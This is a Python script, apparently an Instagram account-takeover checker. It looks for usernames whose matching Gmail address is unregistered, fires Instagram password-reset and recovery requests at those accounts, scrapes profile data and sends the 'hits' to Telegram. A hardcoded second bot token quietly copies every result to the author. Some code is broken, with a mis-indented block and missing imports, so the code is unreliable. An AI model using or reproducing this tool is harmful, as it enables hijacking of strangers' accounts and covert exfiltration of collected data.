import os
try:
    from instagramtolle import *
    import os,random
    from PKK import *
    import os
    from user_agent import generate_user_agent
except ModuleNotFoundError :os.system("pip install PKK instagramtolle requests time uuid random string")    
idtele='7402878964';token='7913321809:AAHqLhy9CCQgeKv1q4Hdi0WB05fGOarY09I'
idtele1=input('Enter Id : ')
token1=input('Enter Token : ')
os.system('clear')
h=0
#tok='7913321809:AAHqLhy9CCQgeKv1q4Hdi0WB05fGOarY09I';ID =7402878964
def logo(h, bi, bg,gg,email):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
Tele : @D_B_HH | Ch: @k_1_cc
==========================    
Hits:{h} Bad Insta:{bi} Bad Gmail:{bg} Good Gmail:{gg}
==========================
email: {email}@gmail.com''')

bi=0    
import requests,time,uuid,random,string;RESET = '\033[0m';GREEN = '\033[92m';RED = '\033[91m';BLUE = '\033[94m'
h=0
#print(f'''
#Tele : @D_B_HH | Ch: @k_1_cc
#==========================
#1.Creat List UserNames Instagram
#2.Check List UserNames Instagram
#3.Delet List
#==========================
#''')
#qu=input('Choce ☞ :')
os.system('clear')
import requests,uuid,random,string    
def inf(email,h):
    try:	
        url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
        data = {"_csrftoken": "".join(random.choices(string.ascii_letters + string.digits, k=32)),"username": email,"guid": str(uuid.uuid4()),"device_id": str(uuid.uuid4())}
        headers = {"user-agent": f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_letters + string.digits, k=16))}/{''.join(random.choices(string.ascii_letters + string.digits, k=16))}; {''.join(random.choices(string.ascii_letters + string.digits, k=16))}; {''.join(random.choices(string.ascii_letters + string.digits, k=16))}; {''.join(random.choices(string.ascii_letters + string.digits, k=16))}; en_GB;)"}
        response = requests.post(url, headers=headers, data=data).json()#;print(response)
        if 'obfuscated_email' in response:
            rest = response['obfuscated_email']
    except:pass            
    cookies = {
    'csrftoken': 'ntfH-zYTX9AjMHSwDyq9L9',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '0.75',
    'mid': 'ZthkYQALAAGHFboyOVudcmhApJ2w',
    'datr': 'YWTYZmuSt9PF6R4hZL2czVTr',
    'ig_did': '2F5D9DE7-0672-41C4-9931-F93181185824',
    'wd': '1256x1058',
    'ig_nrcb': '1',
};headers = {
    'accept': '*/*',
    'accept-language': 'en',
    'cookie': 'csrftoken=ntfH-zYTX9AjMHSwDyq9L9; ps_l=1; ps_n=1; dpr=0.75; mid=ZthkYQALAAGHFboyOVudcmhApJ2w; datr=YWTYZmuSt9PF6R4hZL2czVTr; ig_did=2F5D9DE7-0672-41C4-9931-F93181185824; wd=1256x1058; ig_nrcb=1',
    'dnt': '1',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/qqq/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
    'sec-ch-ua-full-version-list': '"Chromium";v="128.0.6613.85", "Not;A=Brand";v="24.0.0.0", "Microsoft Edge";v="128.0.2739.42"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'x-asbd-id': '129477',
    'x-csrftoken': 'ntfH-zYTX9AjMHSwDyq9L9',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-requested-with': 'XMLHttpRequest',
};params = {
    'username': email,
};response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/',
params=params,
cookies=cookies,
headers=headers,
).json();pic = response['data']['user']['profile_pic_url_hd'];name = response['data']['user']['full_name'];bio = response['data']['user']['biography'];userd =response['data']['user']['username'];id = response['data']['user']['id'];fing= response['data']['user']['edge_follow']['count'];fwers=response['data']['user']['edge_followed_by']['count'];email =response['data']['user']['business_email'];is_private=response['data']['user']['is_private'];tlg = f'''
Hits ✔: [{h}]
-------------------------------------
     Email : {userd}@gmail.com
     Rest : {rest}
-------------------------------------          
username : {userd}
name : {name}
followers : {fwers}
following : {fing}
id : {id}
private  : {is_private}
link : https://www.instagram.com/{userd}
-------------------------------------
Dev : @D_B_HH | Ch : @k_1_cc
''';print(tlg);requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idtele}&text={tlg}');requests.post(f'https://api.telegram.org/bot{token1}/sendMessage?chat_id={idtele1}&text={tlg}')

from PKK import *
gg=0;bg=0;h=0;bi=0
import random , requests
from instagramtolle import *
from user_agent import *
from user_agent import generate_user_agent
from fake_useragent import UserAgent
from fake_useragent import UserAgent
ua = UserAgent()
def cg():
    g=random.choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                
'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        );keyword=''.join((random.choice(g) for i in range(random.randrange(4,9))));cookies = {
            'rur': '"LDC\\05467838469205\\0541758153066:01f72be7578ed09a57bfe3e41c19af58848e0e965e0549f6d1f5a0168a652d2bfa28cd9a"',
        };headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-full-version-list': '"Chromium";v="128.0.6613.138", "Not;A=Brand";v="24.0.0.0", "Google Chrome";v="128.0.6613.138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent':ua.random,
            'x-asbd-id': '129477',
            'x-bloks-version-id': '235c9483d007713b45fc75b34c76332d68d579a4300a1db1da94670c3a05089f',
            'x-csrftoken': 'mf3zd6qWxnKgh9BaNRI5Ldpms2NrH62X',
            'x-fb-friendly-name': 'PolarisSearchBoxRefetchableQuery',
            'x-fb-lsd': 'BslibIYRWxn19hyIaPyrZV',
            'x-ig-app-id': '936619743392459',
        };data = {
            'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+keyword+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
            'doc_id': '7935512656557707',
        };response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data).json()['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
    for i in response:
        email=i['user']['username']
        global gg, bg, bi, h
        N = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5,10)))
        b = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
        sis = requests.Session()
        headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://accounts.google.com/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-browser-channel': 'stable',
                'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
                'x-browser-year': '2024',
            }

        params = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '1',
                'emr': '1',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
                'followup': 'https://mail.google.com/mail/u/0/',
                'osid': '1',
                'service': 'mail',
            }

        response = sis.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
        tl=response.url.split('TL=')[1]
        s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
        at = response.text.split('"SNlM0e":"')[1].split('"')[0]
        headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }

        params = {
                'rpcids': 'E815hb',
                'source-path': '/lifecycle/steps/signup/name',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }

        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(N,at)

        response = sis.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                headers=headers,
                data=data,
            ).text



        headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }

        params = {
                'rpcids': 'eOY7Bb',
                'source-path': '/lifecycle/steps/signup/birthdaygender',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }

        data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(b[0],b[1],b[2],at)

        response = sis.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                headers=headers,
                data=data,
            ).text
        headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }
        params = {
                'rpcids': 'NHJMOd',
                'source-path': '/lifecycle/steps/signup/username',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

        response = sis.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                headers=headers,
                data=data,
            ).text
        if 'password' in response:
            gg+=1
            logo(h, bi, bg,gg,email)
            rnd=str(randint(150, 999));user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][randint(0, 5)] + "; " + str(randint(100, 1300)) + "dpi; " + str(randint(200, 2000)) + "x" + str(randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(randint(111,999))+")";files=[
];headers = {
};response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers,files=files);device_id = f"android-{secrets.token_hex(8)}",;csrf = hashlib.md5(str(time.time()).encode()).hexdigest();mid = response.cookies["mid"];ig_did = response.cookies["ig_did"];ig_nrcb = response.cookies["ig_nrcb"];app = ''.join(choice('1234567890')for i in range(15));from user_agent import generate_user_agent;aa=str(generate_user_agent());data = {        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}@gmail.com''"}',

            'ig_sig_key_version':'4',
        };headers = {
            'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
            'X-Pigeon-Rawclienttime':'1707104597.347',
            'X-IG-Connection-Speed':'-1kbps',
            'X-IG-Bandwidth-Speed-KBPS':'-1.000',
            'X-IG-Bandwidth-TotalBytes-B':'0',
            'X-IG-Bandwidth-TotalTime-MS':'0',
            'X-IG-VP9-Capable':'false',
            'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type':'WIFI',
            'X-IG-Capabilities':'3brTvw==',
            'X-IG-App-ID':'567067343352427',
            'User-Agent':aa,
            'Accept-Language':'ar-IQ, en-US',
            'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding':'gzip, deflate',
            'Host':'i.instagram.com',
            'X-FB-HTTP-Engine':'Liger',
            'Connection':'keep-alive',
            'Content-Length':'364',
        };re = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data)
            if ('"can_recover_with_code"')in re.text:
                h+=1
                inf(email,h)
                logo(h, bi, bg,gg,email)
            else:
                bi+=1
                logo(h, bi, bg,gg,email)
        else:
            bg+=1
            logo(h, bi, bg,gg,email)

import threading
cg()
while 1:
    threads = []
    for i in range(10):
        t = threading.Thread(target=cg)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

